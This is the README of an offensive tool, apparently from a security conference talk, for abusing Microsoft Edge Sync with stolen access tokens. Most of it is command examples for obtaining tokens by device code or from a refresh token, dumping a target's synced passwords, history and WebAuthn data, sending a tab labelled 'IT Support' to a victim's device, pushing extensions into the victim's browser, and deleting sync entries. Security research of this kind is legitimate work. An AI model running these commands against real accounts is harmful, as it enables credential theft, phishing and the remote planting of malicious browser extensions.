# synchole

A small tool to interact with the Microsoft Edge Sync service which can read and write data via the sync service. Based on my talk at BSides Canberra IX "Let It Sync In". Slides and example videos are in the "presentation" folder. I will update shortly when the video of the presentation is released. 

## Building

```bash
go build -o synchole .
```

## Required Tokens

synchole requires two access tokens:

| Token | Flag | Description |
|---|---|---|
| Edge Sync Token | `--msedgetoken` / `-s` | Access token for `edge.microsoft.com` (the sync service) |
| AAD RMS Token | `--aadrmstoken` / `-r` | Access token for `api.aadrm.com` (decrypts the publishing license to obtain the derivation key) |

If you already have the derivation key you can skip the AAD RMS token and pass `--newkey` / `-k` instead.

### Obtaining tokens with roadtx

Use [roadtx](https://github.com/dirkjanm/ROADtools) to acquire the two tokens. Both use the Edge client ID (`ecd6b820-32c2-49b6-98a6-444530e5a77a`).

```bash
roadtx gettokens -c ecd6b820-32c2-49b6-98a6-444530e5a77a -r https://edgesync.microsoft.com -s ".default" --device-code
roadtx gettokens -c ecd6b820-32c2-49b6-98a6-444530e5a77a -r https://aadrm.com -s ".default" --device-code
```

If you have a refresh token or PRT instead of credentials, substitute the appropriate roadtx auth method (e.g. `roadtx gettokens --refresh-token <RT> ...`).

## Usage Examples

### Enum: Dump passwords, devices, and history

```bash
./synchole enum \
  -s "$EDGE_TOKEN" \
  -r "$RMS_TOKEN" \
  --useful
```

`--useful` is a shorthand that requests passwords, device info, and browsing history in one shot.

### Enum: Dump a specific data type by flag

```bash
./synchole enum \
  -s "$EDGE_TOKEN" \
  -r "$RMS_TOKEN" \
  --password --extension --webauthn
```

You can combine any of the type flags: `--password`, `--extension`, `--history`, `--device`, `--preference`, `--webauthn`, `--session`, `--sendtab`, `--autofill`, `--autofillprofile`, `--nigori`, `--edrop`, `--savedtabgroup`, `--userconsent`, `--historydelete`, `--deviceinfo`. Use `--everything` to request every known data type, or `--code <int>` for a raw type id.

### Write: Send a tab to a target device

First enumerate devices to find the target's cache GUID:

```bash
./synchole enum -s "$EDGE_TOKEN" -r "$RMS_TOKEN" --device
# Look for: CacheGUID: abc123DEF456...
```

Then send a tab:

```bash
./synchole sendtab \
  -s "$EDGE_TOKEN" \
  -r "$RMS_TOKEN" \
  --title "Important Document" \
  --url "https://example.com/doc" \
  --target-guid "abc123DEF456..." \
  --from-device "IT Support"
```

The target device will receive a "Tab from IT Support" notification opening the URL.

### Write: Push an extension to the target's browser

```bash
./synchole extension \
  -s "$EDGE_TOKEN" \
  -r "$RMS_TOKEN" \
  --extensionid "<ExtensionID>" \
  --extensionversion "<ExtensionVersion>" \
  --incognito
```

This syncs an extension entry. On next sync the target's Edge will pick up the extension. Use `--remoteinstall` to mark it as a remote-install. The `--updateurl` defaults to the Edge web store CRX endpoint; override it for side-loaded extensions.

### Delete: Remove a sync entry

Delete requires the entry's client tag hash, ID, and version, all of which are printed during enum (with `--debug` for full detail):

```bash
./synchole enum -s "$EDGE_TOKEN" -r "$RMS_TOKEN" --extension --debug
# Look for: Entry Information (ID: <id> CTH: <cth> VERSION: <version>)
```

Then delete:

```bash
./synchole delete \
  -s "$EDGE_TOKEN" \
  -k "$DERIVATION_KEY" \
  --clienttaghash "vPDikqhQynAI+7CGw+XmgO2FaOY=" \
  --id "0b3b8557-18ea-4ae9-aea2-e1dea6829f69" \
  --version "1772188306858"
```
